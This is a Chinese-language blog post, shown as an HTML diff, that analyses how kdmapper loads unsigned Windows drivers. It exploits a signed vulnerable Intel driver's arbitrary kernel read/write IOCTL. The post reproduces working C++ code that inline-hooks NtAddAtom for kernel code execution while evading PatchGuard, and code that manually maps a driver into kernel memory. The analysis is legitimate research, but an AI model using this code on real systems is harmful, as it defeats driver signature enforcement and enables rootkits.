@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Nunito+Sans:400,400i,700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.css">
+<title>加载无签名驱动</title>
+</head>
+<body>
+  <header class="texture-black">
+    <div class="container"></div><div class="container">
+	<h1>加载无签名驱动</h1>
+	<h4 class="post-description"></h4>
+	<div class="post-date" style="margin-top:20px">
+		Published on Jul 19, 2021
+	</div>
+	<ul class="post-tags"><li>driver</li><li>re</li></ul>
+</div>
+</header>
+  <main>
+    <div class="container">
+      <div class="post-container">
+          <p>由于dse的出现，未经签名的驱动无法被内核加载，而使用带有签名的漏洞驱动通过利用漏洞的方式加载无签名的驱动是一种可行的方式。本文将通过分析kdmapper的代码来探究加载无签名驱动的方法。</p>
+
+<h2 id="漏洞分析">漏洞分析</h2>
+
+<p>kdmapper通过加载有签名的漏洞驱动并利用漏洞来实现加载未签名驱动的功能。漏洞的位置位于驱动ioctl处理函数中，驱动在初始化过程中注册了ioctl处理函数并在控制码为0x80862007的对应函数中提供了任意地址读写、获取物理地址、映射任意地址等功能</p>
+
+<p><img src="https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210719111311394.png" alt="image-20210719111311394" /></p>
+
+<p>映射地址功能</p>
+
+<p><img src="https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210719111346099.png" alt="image-20210719111346099" /></p>
+
+<p>获取物理地址</p>
+
+<p><img src="https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210719111406927.png" alt="image-20210719111406927" /></p>
+
+<p>任意地址读写</p>
+
+<p><img src="https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20210719111433722.png" alt="image-20210719111433722" /></p>
+
+<h2 id="从任意地址写到代码执行">从任意地址写到代码执行</h2>
+
+<p>由于漏洞驱动提供了获取物理地址以及映射物理地址的功能，因此kdmapper可以使用映射物理地址的方式读写被保护的内存，通过对内核函数进行inline hook的方法进行劫持实现任意代码执行。</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code>		<span class="c1">//获取r3 NtAddAtom地址</span>
+		<span class="n">HMODULE</span> <span class="n">ntdll</span> <span class="o">=</span> <span class="n">GetModuleHandleA</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">);</span>
+
+		<span class="k">const</span> <span class="k">auto</span> <span class="n">NtAddAtom</span> <span class="o">=</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="kt">void</span><span class="o">*&gt;</span><span class="p">(</span><span class="n">GetProcAddress</span><span class="p">(</span><span class="n">ntdll</span><span class="p">,</span> <span class="s">"NtAddAtom"</span><span class="p">));</span>
+
+		<span class="c1">//inline hook 使用的跳转代码</span>
+		<span class="kt">uint8_t</span> <span class="n">kernel_injected_jmp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x48</span><span class="p">,</span> <span class="mh">0xb8</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0xe0</span> <span class="p">};</span>
+		<span class="kt">uint8_t</span> <span class="n">original_kernel_function</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">kernel_injected_jmp</span><span class="p">)];</span>
+		<span class="o">*</span><span class="p">(</span><span class="kt">uint64_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">kernel_injected_jmp</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">kernel_function_address</span><span class="p">;</span>
+		
+		<span class="c1">//获取r0 NtAddAtom地址</span>
+		<span class="k">static</span> <span class="kt">uint64_t</span> <span class="n">kernel_NtAddAtom</span> <span class="o">=</span> <span class="n">GetKernelModuleExport</span><span class="p">(</span><span class="n">device_handle</span><span class="p">,</span> <span class="n">intel_driver</span><span class="o">::</span><span class="n">ntoskrnlAddr</span><span class="p">,</span> <span class="s">"NtAddAtom"</span><span class="p">);</span>
+
+
+		<span class="c1">// Overwrite the pointer with kernel_function_address</span>
+		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">WriteToReadOnlyMemory</span><span class="p">(</span><span class="n">device_handle</span><span class="p">,</span> <span class="n">kernel_NtAddAtom</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">kernel_injected_jmp</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">kernel_injected_jmp</span><span class="p">)))</span>
+			<span class="k">return</span> <span class="nb">false</span><span class="p">;</span>
+
+		<span class="c1">// Call function</span>
+		<span class="k">if</span> <span class="nf">constexpr</span> <span class="p">(</span><span class="o">!</span><span class="n">call_void</span><span class="p">)</span> <span class="p">{</span>
+			<span class="k">using</span> <span class="n">FunctionFn</span> <span class="o">=</span> <span class="n">T</span><span class="p">(</span><span class="kr">__stdcall</span><span class="o">*</span><span class="p">)(</span><span class="n">A</span><span class="p">...);</span>
+			<span class="k">const</span> <span class="k">auto</span> <span class="n">Function</span> <span class="o">=</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="n">FunctionFn</span><span class="o">&gt;</span><span class="p">(</span><span class="n">NtAddAtom</span><span class="p">);</span>
+
+			<span class="o">*</span><span class="n">out_result</span> <span class="o">=</span> <span class="n">Function</span><span class="p">(</span><span class="n">arguments</span><span class="p">...);</span>
+		<span class="p">}</span>
+		<span class="k">else</span> <span class="p">{</span>
+			<span class="k">using</span> <span class="n">FunctionFn</span> <span class="o">=</span> <span class="kt">void</span><span class="p">(</span><span class="kr">__stdcall</span><span class="o">*</span><span class="p">)(</span><span class="n">A</span><span class="p">...);</span>
+			<span class="k">const</span> <span class="k">auto</span> <span class="n">Function</span> <span class="o">=</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="n">FunctionFn</span><span class="o">&gt;</span><span class="p">(</span><span class="n">NtAddAtom</span><span class="p">);</span>
+
+			<span class="n">Function</span><span class="p">(</span><span class="n">arguments</span><span class="p">...);</span>
+		<span class="p">}</span>
+
+		<span class="c1">// Restore the pointer/jmp</span>
+		<span class="n">WriteToReadOnlyMemory</span><span class="p">(</span><span class="n">device_handle</span><span class="p">,</span> <span class="n">kernel_NtAddAtom</span><span class="p">,</span> <span class="n">original_kernel_function</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">kernel_injected_jmp</span><span class="p">));</span>
+
+</code></pre></div></div>
+
+<p>在inlinehook函数之后，通过在r3调用NtAddAtom触发inline hook。为了避免被PG检测到，在调用完成后立即恢复原函数</p>
+
+<h2 id="内存加载驱动">内存加载驱动</h2>
+
+<p>驱动文件同样是PE结构的文件，因此内存加载方式几乎一样，在处理完导入表和重定位后，三环程序通过漏洞驱动将驱动镜像写入到分配好的内核地址中，接着调用驱动的入口函数完成驱动的加载。</p>
+
+<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">std</span><span class="o">::</span><span class="n">vector</span><span class="o">&lt;</span><span class="kt">uint8_t</span><span class="o">&gt;</span> <span class="n">raw_image</span> <span class="o">=</span> <span class="p">{</span> <span class="mi">0</span> <span class="p">};</span>
+
+	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">utils</span><span class="o">::</span><span class="n">ReadFileToMemory</span><span class="p">(</span><span class="n">driver_path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">raw_image</span><span class="p">))</span> <span class="p">{</span>
+		<span class="n">Log</span><span class="p">(</span><span class="s">L"[-] Failed to read image to memory"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">);</span>
+		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="p">}</span>
+
+	<span class="k">const</span> <span class="n">PIMAGE_NT_HEADERS64</span> <span class="n">nt_headers</span> <span class="o">=</span> <span class="n">portable_executable</span><span class="o">::</span><span class="n">GetNtHeaders</span><span class="p">(</span><span class="n">raw_image</span><span class="p">.</span><span class="n">data</span><span class="p">());</span>
+
+	<span class="k">const</span> <span class="kt">uint32_t</span> <span class="n">image_size</span> <span class="o">=</span> <span class="n">nt_headers</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">SizeOfImage</span><span class="p">;</span>
+
+	<span class="kt">void</span><span class="o">*</span> <span class="n">local_image_base</span> <span class="o">=</span> <span class="n">VirtualAlloc</span><span class="p">(</span><span class="nb">nullptr</span><span class="p">,</span> <span class="n">image_size</span><span class="p">,</span> <span class="n">MEM_RESERVE</span> <span class="o">|</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_READWRITE</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">local_image_base</span><span class="p">)</span>
+		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+
+	<span class="n">DWORD</span> <span class="n">TotalVirtualHeaderSize</span> <span class="o">=</span> <span class="p">(</span><span class="n">IMAGE_FIRST_SECTION</span><span class="p">(</span><span class="n">nt_headers</span><span class="p">))</span><span class="o">-&gt;</span><span class="n">VirtualAddress</span><span class="p">;</span>
+
+	<span class="kt">uint64_t</span> <span class="n">kernel_image_base</span> <span class="o">=</span> <span class="n">intel_driver</span><span class="o">::</span><span class="n">AllocatePool</span><span class="p">(</span><span class="n">iqvw64e_device_handle</span><span class="p">,</span> <span class="n">nt</span><span class="o">::</span><span class="n">POOL_TYPE</span><span class="o">::</span><span class="n">NonPagedPool</span><span class="p">,</span> <span class="n">image_size</span> <span class="o">-</span> <span class="p">(</span><span class="n">destroyHeader</span> <span class="o">?</span> <span class="n">TotalVirtualHeaderSize</span> <span class="o">:</span> <span class="mi">0</span><span class="p">));</span>
+
+	<span class="k">do</span> <span class="p">{</span>
+		<span class="c1">// Copy image headers</span>
+
+		<span class="n">memcpy</span><span class="p">(</span><span class="n">local_image_base</span><span class="p">,</span> <span class="n">raw_image</span><span class="p">.</span><span class="n">data</span><span class="p">(),</span> <span class="n">nt_headers</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">SizeOfHeaders</span><span class="p">);</span>
+
+		<span class="c1">// Copy image sections</span>
+
+		<span class="k">const</span> <span class="n">PIMAGE_SECTION_HEADER</span> <span class="n">current_image_section</span> <span class="o">=</span> <span class="n">IMAGE_FIRST_SECTION</span><span class="p">(</span><span class="n">nt_headers</span><span class="p">);</span>
+
+		<span class="k">for</span> <span class="p">(</span><span class="k">auto</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">nt_headers</span><span class="o">-&gt;</span><span class="n">FileHeader</span><span class="p">.</span><span class="n">NumberOfSections</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+			<span class="k">auto</span> <span class="n">local_section</span> <span class="o">=</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="kt">void</span><span class="o">*&gt;</span><span class="p">(</span><span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="kt">uint64_t</span><span class="o">&gt;</span><span class="p">(</span><span class="n">local_image_base</span><span class="p">)</span> <span class="o">+</span> <span class="n">current_image_section</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">VirtualAddress</span><span class="p">);</span>
+			<span class="n">memcpy</span><span class="p">(</span><span class="n">local_section</span><span class="p">,</span> <span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="kt">void</span><span class="o">*&gt;</span><span class="p">(</span><span class="k">reinterpret_cast</span><span class="o">&lt;</span><span class="kt">uint64_t</span><span class="o">&gt;</span><span class="p">(</span><span class="n">raw_image</span><span class="p">.</span><span class="n">data</span><span class="p">())</span> <span class="o">+</span> <span class="n">current_image_section</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">PointerToRawData</span><span class="p">),</span> <span class="n">current_image_section</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">SizeOfRawData</span><span class="p">);</span>
+		<span class="p">}</span>
+
+		<span class="kt">uint64_t</span> <span class="n">realBase</span> <span class="o">=</span> <span class="n">kernel_image_base</span><span class="p">;</span>
+		<span class="k">if</span> <span class="p">(</span><span class="n">destroyHeader</span><span class="p">)</span> <span class="p">{</span>
+			<span class="n">kernel_image_base</span> <span class="o">-=</span> <span class="n">TotalVirtualHeaderSize</span><span class="p">;</span>
+			<span class="n">Log</span><span class="p">(</span><span class="s">L"[+] Skipped 0x"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">TotalVirtualHeaderSize</span> <span class="o">&lt;&lt;</span> <span class="s">L" bytes of PE Header"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">);</span>
+		<span class="p">}</span>
+
+		<span class="c1">// Resolve relocs and imports</span>
+
+		<span class="n">RelocateImageByDelta</span><span class="p">(</span><span class="n">portable_executable</span><span class="o">::</span><span class="n">GetRelocs</span><span class="p">(</span><span class="n">local_image_base</span><span class="p">),</span> <span class="n">kernel_image_base</span> <span class="o">-</span> <span class="n">nt_headers</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">ImageBase</span><span class="p">);</span>
+
+		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ResolveImports</span><span class="p">(</span><span class="n">iqvw64e_device_handle</span><span class="p">,</span> <span class="n">portable_executable</span><span class="o">::</span><span class="n">GetImports</span><span class="p">(</span><span class="n">local_image_base</span><span class="p">)))</span> <span class="p">{</span>
+			<span class="n">Log</span><span class="p">(</span><span class="s">L"[-] Failed to resolve imports"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">);</span>
+			<span class="n">kernel_image_base</span> <span class="o">=</span> <span class="n">realBase</span><span class="p">;</span>
+			<span class="k">break</span><span class="p">;</span>
+		<span class="p">}</span>
+
+		<span class="c1">// Write fixed image to kernel</span>
+
+		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">intel_driver</span><span class="o">::</span><span class="n">WriteMemory</span><span class="p">(</span><span class="n">iqvw64e_device_handle</span><span class="p">,</span> <span class="n">realBase</span><span class="p">,</span> <span class="p">(</span><span class="n">PVOID</span><span class="p">)((</span><span class="kt">uintptr_t</span><span class="p">)</span><span class="n">local_image_base</span> <span class="o">+</span> <span class="p">(</span><span class="n">destroyHeader</span> <span class="o">?</span> <span class="n">TotalVirtualHeaderSize</span> <span class="o">:</span> <span class="mi">0</span><span class="p">)),</span> <span class="n">image_size</span> <span class="o">-</span> <span class="p">(</span><span class="n">destroyHeader</span> <span class="o">?</span> <span class="n">TotalVirtualHeaderSize</span> <span class="o">:</span> <span class="mi">0</span><span class="p">)))</span> <span class="p">{</span>
+			<span class="n">Log</span><span class="p">(</span><span class="s">L"[-] Failed to write local image to remote image"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">);</span>
+			<span class="n">kernel_image_base</span> <span class="o">=</span> <span class="n">realBase</span><span class="p">;</span>
+			<span class="k">break</span><span class="p">;</span>
+		<span class="p">}</span>
+
+		<span class="c1">// Call driver entry point</span>
+
+		<span class="k">const</span> <span class="kt">uint64_t</span> <span class="n">address_of_entry_point</span> <span class="o">=</span> <span class="n">kernel_image_base</span> <span class="o">+</span> <span class="n">nt_headers</span><span class="o">-&gt;</span><span class="n">OptionalHeader</span><span class="p">.</span><span class="n">AddressOfEntryPoint</span><span class="p">;</span>
+        
+		<span class="n">NTSTATUS</span> <span class="n">status</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+
+		<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">intel_driver</span><span class="o">::</span><span class="n">CallKernelFunction</span><span class="p">(</span><span class="n">iqvw64e_device_handle</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">status</span><span class="p">,</span> <span class="n">address_of_entry_point</span><span class="p">,</span> <span class="n">param1</span><span class="p">,</span> <span class="n">param2</span><span class="p">))</span> <span class="p">{</span>
+			<span class="n">Log</span><span class="p">(</span><span class="s">L"[-] Failed to call driver entry"</span> <span class="o">&lt;&lt;</span> <span class="n">std</span><span class="o">::</span><span class="n">endl</span><span class="p">);</span>
+			<span class="n">kernel_image_base</span> <span class="o">=</span> <span class="n">realBase</span><span class="p">;</span>
+			<span class="k">break</span><span class="p">;</span>
+		<span class="p">}</span>
+
+		<span class="k">if</span> <span class="p">(</span><span class="n">free</span><span class="p">)</span>
+			<span class="n">intel_driver</span><span class="o">::</span><span class="n">FreePool</span><span class="p">(</span><span class="n">iqvw64e_device_handle</span><span class="p">,</span> <span class="n">realBase</span><span class="p">);</span>
+
+		<span class="n">VirtualFree</span><span class="p">(</span><span class="n">local_image_base</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">MEM_RELEASE</span><span class="p">);</span>
+		<span class="k">return</span> <span class="n">realBase</span><span class="p">;</span>
+
+	<span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="nb">false</span><span class="p">);</span>
+
+
+	<span class="n">VirtualFree</span><span class="p">(</span><span class="n">local_image_base</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">MEM_RELEASE</span><span class="p">);</span>
+
+	<span class="n">intel_driver</span><span class="o">::</span><span class="n">FreePool</span><span class="p">(</span><span class="n">iqvw64e_device_handle</span><span class="p">,</span> <span class="n">kernel_image_base</span><span class="p">);</span>
+</code></pre></div></div>
+
+
+      </div>
+
+        <!-- Configure Disqus --></div>
+  </main></body>
+</html>
